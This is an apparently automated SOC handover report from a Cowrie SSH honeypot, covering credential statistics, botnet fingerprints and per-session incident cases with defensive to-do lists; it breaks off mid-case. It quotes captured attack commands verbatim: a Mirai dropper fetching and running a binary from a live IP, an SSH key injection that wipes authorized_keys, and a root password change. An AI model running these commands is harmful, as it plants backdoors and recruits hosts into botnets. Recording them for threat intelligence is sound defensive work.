# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-10-26 |
| **Generated At** | 2026-10-26T17:54:17Z |
| **Shift Time** | 17:54 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **707** |
| Confirmed Threats | **609** |
| False Positives Filtered | **98** (13.9%) |
| Unique Attacker IPs | **391** |
| Countries of Origin | **65** |
| High Severity Cases | **440** |
| Medium Severity Cases | **1** |
| Low Severity Cases | **266** |
| Malware Samples Analyzed | **9** HIGH · **26** MED · 1 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **7642** |
| Unique Credential Pairs | **1846** |
| Unique Usernames | **666** |
| Unique Passwords | **1333** |
| Successful Auth Pairs | **6947** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 2401 |
| `ubuntu` | 381 |
| `345gs5662d34` | 206 |
| `admin` | 187 |
| `user` | 139 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `123456` | 385 |
| `3245gs5662d34` | 207 |
| `345gs5662d34` | 206 |
| `123` | 190 |
| `1234` | 139 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 206 |
| `root` | `3245gs5662d34` | 166 |
| `support` | `support` | 28 |
| `root` | `123456` | 20 |
| `admin` | `` | 16 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `tirex` | `tirex` | `77.239.124.155` | 2026-10-26T00:55:07 |
| `myuser` | `123456` | `77.239.124.155` | 2026-10-26T00:55:14 |
| `root` | `0000011111` | `77.239.124.155` | 2026-10-26T00:55:20 |
| `daniel` | `daniel` | `77.239.124.155` | 2026-10-26T00:55:26 |
| `nitin` | `nitin` | `77.239.124.155` | 2026-10-26T00:55:31 |
| `pzuser` | `esuser` | `77.239.124.155` | 2026-10-26T00:55:38 |
| `v1` | `123456` | `77.239.124.155` | 2026-10-26T00:55:45 |
| `dev` | `password` | `77.239.124.155` | 2026-10-26T00:55:51 |
| `admin` | `090807` | `77.239.124.155` | 2026-10-26T00:55:56 |
| `manager` | `ghost` | `77.239.124.155` | 2026-10-26T00:56:03 |
| `root` | `admin1` | `77.239.124.155` | 2026-10-26T00:56:09 |
| `centreon` | `centreon` | `77.239.124.155` | 2026-10-26T00:56:16 |
| `root` | `Test.123` | `77.239.124.155` | 2026-10-26T00:56:21 |
| `kingbase` | `kingbase@2022` | `77.239.124.155` | 2026-10-26T00:56:26 |
| `odoo16` | `Aa123456` | `77.239.124.155` | 2026-10-26T00:56:33 |
| `root` | `AAAaaa123` | `77.239.124.155` | 2026-10-26T00:56:39 |
| `root` | `!@` | `77.239.124.155` | 2026-10-26T00:56:45 |
| `jay` | `jay` | `77.239.124.155` | 2026-10-26T00:56:51 |
| `kevin` | `P@ssword123` | `77.239.124.155` | 2026-10-26T00:56:57 |
| `deploy` | `deploy@123` | `77.239.124.155` | 2026-10-26T00:57:04 |
_… 6927 more successful pair(s) in credentials.json_

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **707** |
| Sessions with Fingerprint | **34** |
| Unique HASSH Fingerprints | **34** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 330 |
| Go SSH scanner | 125 |
| OpenSSH | 17 |
| Paramiko (Python) | 9 |
| Unknown | 7 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `f555226df196...` | Mirai/variant | 297 | 146 |
| `2ec37a7cc8da...` | Mirai/variant | 62 | 4 |
| `0a07365cc01f...` | Generic scanner | 15 | 5 |
| `16443846184e...` | Generic scanner | 14 | 6 |
| `390ffe68a68c...` | Modern SSH client | 13 | 4 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `f555226df196...` | libssh | 297 | 146 | Mirai/variant |
| `2ec37a7cc8da...` | Go SSH scanner | 62 | 4 | Mirai/variant |
| `0a07365cc01f...` | Go SSH scanner | 15 | 5 | Generic scanner |
| `95420f9d932d...` | libssh | 15 | 7 | — |
| `16443846184e...` | Go SSH scanner | 14 | 6 | Generic scanner |
| `390ffe68a68c...` | OpenSSH | 13 | 4 | Modern SSH client |
| `eff4c24daffc...` | Go SSH scanner | 9 | 1 | Modern SSH client |
| `03a80b21afa8...` | libssh | 9 | 5 | Modern SSH client |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **80** |
| Campaign Clusters | **5** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **Mirai/IoT Botnet** | 🔴 HIGH | 2 | 1 | `T1105, T1140, T1059.004` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1083, T1082` |
| **Mirai/IoT Botnet** | 🔴 HIGH | 1 | 1 | `T1082, T1592, T1105, T1059.004` |
| **Mirai/IoT Botnet** | 🔴 HIGH | 1 | 1 | `T1082, T1105, T1059.004` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 146 | 138 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · Mirai/IoT Botnet**

> Mirai-family IoT botnet. Executes busybox payloads for DDoS bot recruitment.

Representative commands:
```
cd /tmp || cd /var || cd /dev/shm || cd /mnt ; ( wget -q -O main_arm7 http://152.42.195.115:80/main_arm7 || busybox wget http://152.42.195.115:80/main_arm7 -O main_arm7 || curl -s -O http://152.42.195.115:80/main_arm7 || tftp -g -b 1468 -r main_arm7 -l main_arm7 152.42.195.115 69 || tftp -g -r main_arm7 -l main_arm7 152.42.195.115 || busybox tftp -g -r main_arm7 152.42.195.115 || ftpget -v -u anonymous -p a 152.42.195.115 main_arm7 main_arm7 ) 2>/dev/null; chmod 777 main_arm7; (./main_arm7 main_arm7 </dev/n
```
```
wget -q -O main_arm7 http://152.42.195.115:80/main_arm7
```
```
busybox wget http://152.42.195.115:80/main_arm7 -O main_arm7
```
```
curl -s -O http://152.42.195.115:80/main_arm7
```
```
tftp -g -b 1468 -r main_arm7 -l main_arm7 152.42.195.115 69
```
Source IPs: `152.42.223.6`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:IIsQAaLnFR2M"|chpasswd|bash
```
```
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
```
Source IPs: `203.66.168.131`

**🔴 HIGH · Mirai/IoT Botnet**

> Mirai-family IoT botnet. Executes busybox payloads for DDoS bot recruitment.

Representative commands:
```
sh
```
```
shell
```
```
enable
```
```
system
```
```
ping; sh
```
Source IPs: `85.130.237.235`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **391** |
| Unique ASNs | **168** |
| High-Risk ASNs | **114** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS0` |  | 87 | HIGH |
| `AS396982` | Google LLC | 17 | HIGH |
| `AS135377` | UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED | 16 | HIGH |
| `AS31898` | Oracle Corporation | 15 | HIGH |
| `AS4766` | Korea Telecom | 13 | HIGH |
| `AS4134` | CHINANET BACKBONE | 10 | HIGH |
| `AS8075` | Microsoft Corporation | 9 | HIGH |
| `AS398324` | Censys, Inc. | 8 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (435)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-846c5ac2f1f4

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]155` |
| **First Seen** | 2026-10-26 00:55 |
| **Last Seen** | 2026-10-26 00:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-26 00:55:07` | `cowrie.session.connect` |
| `2026-10-26 00:55:07` | `cowrie.client.version` |
| `2026-10-26 00:55:07` | `cowrie.client.kex` |
| `2026-10-26 00:55:07` | `cowrie.login.success` |
| `2026-10-26 00:55:08` | `cowrie.session.params` |
| `2026-10-26 00:55:08` | `cowrie.command.input` |
| `2026-10-26 00:55:08` | `cowrie.log.closed` |
| `2026-10-26 00:55:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]155` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]155` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-819018028c0e

| Field | Detail |
|---|---|
| **Source IP** | `78.128.112[.]74` |
| **First Seen** | 2026-10-26 01:01 |
| **Last Seen** | 2026-10-26 01:01 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo 'SSH check'` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-26 01:01:50` | `cowrie.session.connect` |
| `2026-10-26 01:01:50` | `cowrie.client.version` |
| `2026-10-26 01:01:50` | `cowrie.client.kex` |
| `2026-10-26 01:01:51` | `cowrie.login.success` |
| `2026-10-26 01:01:52` | `cowrie.session.params` |
| `2026-10-26 01:01:52` | `cowrie.command.input` |
| `2026-10-26 01:01:53` | `cowrie.log.closed` |
| `2026-10-26 01:01:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `78.128.112[.]74` to AbuseIPDB if not already reported
- [ ] Block `78.128.112[.]74` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0faf3b92e9e1

| Field | Detail |
|---|---|
| **Source IP** | `193.187.110[.]159` |
| **First Seen** | 2026-10-26 01:08 |
| **Last Seen** | 2026-10-26 01:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-26 01:08:18` | `cowrie.session.connect` |
| `2026-10-26 01:08:18` | `cowrie.client.version` |
| `2026-10-26 01:08:18` | `cowrie.client.kex` |
| `2026-10-26 01:08:19` | `cowrie.login.success` |
| `2026-10-26 01:08:19` | `cowrie.direct-tcpip.request` |
| `2026-10-26 01:08:19` | `cowrie.direct-tcpip.ja4h` |
| `2026-10-26 01:08:19` | `cowrie.direct-tcpip.data` |
| `2026-10-26 01:08:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.187.110[.]159` to AbuseIPDB if not already reported
- [ ] Block `193.187.110[.]159` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1c7bc29523c8

| Field | Detail |
|---|---|
| **Source IP** | `173.212.216[.]242` |
| **First Seen** | 2026-10-26 01:09 |
| **Last Seen** | 2026-10-26 01:09 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-26 01:09:36` | `cowrie.session.connect` |
| `2026-10-26 01:09:36` | `cowrie.client.version` |
| `2026-10-26 01:09:36` | `cowrie.client.kex` |
| `2026-10-26 01:09:36` | `cowrie.login.success` |
| `2026-10-26 01:09:37` | `cowrie.session.params` |
| `2026-10-26 01:09:37` | `cowrie.command.input` |
| `2026-10-26 01:09:37` | `cowrie.command.failed` |
| `2026-10-26 01:09:37` | `cowrie.log.closed` |
| `2026-10-26 01:09:38` | `cowrie.session.params` |
| `2026-10-26 01:09:38` | `cowrie.command.input` |
| `2026-10-26 01:09:38` | `cowrie.session.file_download` |
| `2026-10-26 01:09:38` | `cowrie.log.closed` |
| `2026-10-26 01:09:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `173.212.216[.]242` to AbuseIPDB if not already reported
- [ ] Block `173.212.216[.]242` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-804b85685417

| Field | Detail |
|---|---|
| **Source IP** | `173.212.216[.]242` |
| **First Seen** | 2026-10-26 01:09 |
| **Last Seen** | 2026-10-26 01:09 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-26 01:09:39` | `cowrie.session.connect` |
| `2026-10-26 01:09:39` | `cowrie.client.version` |
| `2026-10-26 01:09:39` | `cowrie.client.kex` |
| `2026-10-26 01:09:39` | `cowrie.login.success` |
| `2026-10-26 01:09:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `173.212.216[.]242` to AbuseIPDB if not already reported
- [ ] Block `173.212.216[.]242` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6dfccff6af56

| Field | Detail |
|---|---|
| **Source IP** | `91.231.218[.]149` |
| **First Seen** | 2026-10-26 01:12 |
| **Last Seen** | 2026-10-26 01:12 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-26 01:12:05` | `cowrie.session.connect` |
| `2026-10-26 01:12:05` | `cowrie.client.version` |
| `2026-10-26 01:12:05` | `cowrie.client.kex` |
| `2026-10-26 01:12:05` | `cowrie.login.success` |
| `2026-10-26 01:12:06` | `cowrie.session.params` |
| `2026-10-26 01:12:06` | `cowrie.command.input` |
| `2026-10-26 01:12:07` | `cowrie.command.failed` |
| `2026-10-26 01:12:07` | `cowrie.log.closed` |
| `2026-10-26 01:12:07` | `cowrie.session.params` |
| `2026-10-26 01:12:07` | `cowrie.command.input` |
| `2026-10-26 01:12:08` | `cowrie.session.file_download` |
| `2026-10-26 01:12:08` | `cowrie.log.closed` |
| `2026-10-26 01:12:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.231.218[.]149` to AbuseIPDB if not already reported
- [ ] Block `91.231.218[.]149` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0a971ceebdde

| Field | Detail |
|---|---|
| **Source IP** | `91.231.218[.]149` |
| **First Seen** | 2026-10-26 01:12 |
| **Last Seen** | 2026-10-26 01:12 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-26 01:12:08` | `cowrie.session.connect` |
| `2026-10-26 01:12:08` | `cowrie.client.version` |
| `2026-10-26 01:12:08` | `cowrie.client.kex` |
| `2026-10-26 01:12:09` | `cowrie.login.success` |
| `2026-10-26 01:12:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.231.218[.]149` to AbuseIPDB if not already reported
- [ ] Block `91.231.218[.]149` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9aed9a3d77ff

| Field | Detail |
|---|---|
| **Source IP** | `193.112.192[.]91` |
| **First Seen** | 2026-10-26 01:23 |
| **Last Seen** | 2026-10-26 01:23 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `hostname` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-26 01:23:38` | `cowrie.session.connect` |
| `2026-10-26 01:23:38` | `cowrie.client.version` |
| `2026-10-26 01:23:39` | `cowrie.client.kex` |
| `2026-10-26 01:23:40` | `cowrie.login.success` |
| `2026-10-26 01:23:41` | `cowrie.session.params` |
| `2026-10-26 01:23:41` | `cowrie.command.input` |
| `2026-10-26 01:23:41` | `cowrie.log.closed` |
| `2026-10-26 01:23:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.112.192[.]91` to AbuseIPDB if not already reported
- [ ] Block `193.112.192[.]91` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-27d99cafc7aa

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-10-26 01:41 |
| **Last Seen** | 2026-10-26 01:42 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-26 01:41:59` | `cowrie.session.connect` |
| `2026-10-26 01:41:59` | `cowrie.client.version` |
| `2026-10-26 01:42:00` | `cowrie.client.kex` |
| `2026-10-26 01:42:00` | `cowrie.login.success` |
| `2026-10-26 01:42:00` | `cowrie.direct-tcpip.request` |
| `2026-10-26 01:42:00` | `cowrie.direct-tcpip.data` |
| `2026-10-26 01:42:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6f96e204312a

| Field | Detail |
|---|---|
| **Source IP** | `152.32.191[.]130` |
| **First Seen** | 2026-10-26 01:44 |
| **Last Seen** | 2026-10-26 01:44 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-26 01:44:04` | `cowrie.session.connect` |
| `2026-10-26 01:44:04` | `cowrie.client.version` |
| `2026-10-26 01:44:04` | `cowrie.client.kex` |
| `2026-10-26 01:44:05` | `cowrie.login.success` |
| `2026-10-26 01:44:06` | `cowrie.session.params` |
| `2026-10-26 01:44:06` | `cowrie.command.input` |
| `2026-10-26 01:44:06` | `cowrie.command.failed` |
| `2026-10-26 01:44:06` | `cowrie.log.closed` |
| `2026-10-26 01:44:07` | `cowrie.session.params` |
| `2026-10-26 01:44:07` | `cowrie.command.input` |
| `2026-10-26 01:44:07` | `cowrie.session.file_download` |
| `2026-10-26 01:44:07` | `cowrie.log.closed` |
| `2026-10-26 01:44:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.32.191[.]130` to AbuseIPDB if not already reported
- [ ] Block `152.32.191[.]130` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a2eb960e6b95

| Field | Detail |
|---|---|
| **Source IP** | `152.32.191[.]130` |
| **First Seen** | 2026-10-26 01:44 |
| **Last Seen** | 2026-10-26 01:44 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-26 01:44:08` | `cowrie.session.connect` |
| `2026-10-26 01:44:08` | `cowrie.client.version` |
| `2026-10-26 01:44:08` | `cowrie.client.kex` |
| `2026-10-26 01:44:09` | `cowrie.login.success` |
| `2026-10-26 01:44:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.32.191[.]130` to AbuseIPDB if not already reported
- [ ] Block `152.32.191[.]130` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-93d7585789c3

| Field | Detail |
|---|---|
| **Source IP** | `52.237.80[.]79` |
| **First Seen** | 2026-10-26 01:49 |
| **Last Seen** | 2026-10-26 01:49 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-26 01:49:27` | `cowrie.session.connect` |
| `2026-10-26 01:49:27` | `cowrie.client.version` |
| `2026-10-26 01:49:27` | `cowrie.client.kex` |
| `2026-10-26 01:49:28` | `cowrie.login.success` |
| `2026-10-26 01:49:29` | `cowrie.session.params` |
| `2026-10-26 01:49:29` | `cowrie.command.input` |
| `2026-10-26 01:49:29` | `cowrie.command.failed` |
| `2026-10-26 01:49:30` | `cowrie.log.closed` |
| `2026-10-26 01:49:30` | `cowrie.session.params` |
| `2026-10-26 01:49:30` | `cowrie.command.input` |
| `2026-10-26 01:49:31` | `cowrie.session.file_download` |
| `2026-10-26 01:49:31` | `cowrie.log.closed` |
| `2026-10-26 01:49:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `52.237.80[.]79` to AbuseIPDB if not already reported
- [ ] Block `52.237.80[.]79` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f3525c5e8e6f

| Field | Detail |
|---|---|
| **Source IP** | `52.237.80[.]79` |
| **First Seen** | 2026-10-26 01:49 |
| **Last Seen** | 2026-10-26 01:49 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-26 01:49:31` | `cowrie.session.connect` |
| `2026-10-26 01:49:31` | `cowrie.client.version` |
| `2026-10-26 01:49:31` | `cowrie.client.kex` |
| `2026-10-26 01:49:32` | `cowrie.login.success` |
| `2026-10-26 01:49:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `52.237.80[.]79` to AbuseIPDB if not already reported
- [ ] Block `52.237.80[.]79` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f11e60cee833

| Field | Detail |
|---|---|
| **Source IP** | `79.3.96[.]178` |
| **First Seen** | 2026-10-26 01:55 |
| **Last Seen** | 2026-10-26 01:55 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
